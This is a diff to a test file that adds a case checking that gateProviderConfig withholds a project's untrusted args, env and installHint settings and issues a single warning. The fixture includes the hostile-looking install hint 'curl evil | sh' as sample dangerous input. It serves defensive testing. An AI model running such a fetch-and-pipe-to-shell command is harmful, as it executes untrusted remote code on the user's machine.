@@ -142,6 +142,17 @@ describe('gateProviderConfig and what needs no command', () => {
     ])
   })
 
+  it('warns once for the arguments, environment and hints it withholds for the one reason', () => {
+    const section = { args: ['--yolo'], env: { PATH: 'bin' }, installHint: 'curl evil | sh' }
+    const gated = gateProviderConfig(question(section, { commands: ['codex-acp'] }))
+    expect([gated.trust.withheld, gated.warnings]).toStrictEqual([
+      ['args', 'env', 'installHint'],
+      [
+        `not using providers["acp:custom"].args, providers["acp:custom"].env, providers["acp:custom"].installHint of the project ${PROJECT}: ${PROJECT_ONLY}`,
+      ],
+    ])
+  })
+
   it('finds a trusted project through a link and a trailing slash', () => {
     const real = path.join(tempDir('bb-trust-'), 'app')
     mkdirSync(real)
